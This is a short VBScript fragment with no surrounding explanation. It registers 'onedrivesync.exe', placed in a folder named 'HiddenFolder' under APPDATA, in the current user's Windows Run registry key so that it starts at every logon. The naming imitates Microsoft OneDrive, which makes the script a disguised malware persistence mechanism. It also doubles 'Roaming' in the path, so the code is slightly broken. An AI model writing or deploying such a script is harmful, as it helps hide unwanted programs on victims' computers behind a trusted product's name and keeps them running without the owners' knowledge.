
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

downloadFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Roaming\HiddenFolder")
exePath = downloadFolder & "\onedrivesync.exe"

regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
exeName = "onedrivesync"
cmdLine = Chr(34) & exePath & Chr(34)  

Set objRegistry = CreateObject("WScript.Shell")
objRegistry.RegWrite regKey & "\" & exeName, cmdLine

Set objShell = Nothing
Set objFSO = Nothing
Set objRegistry = Nothing
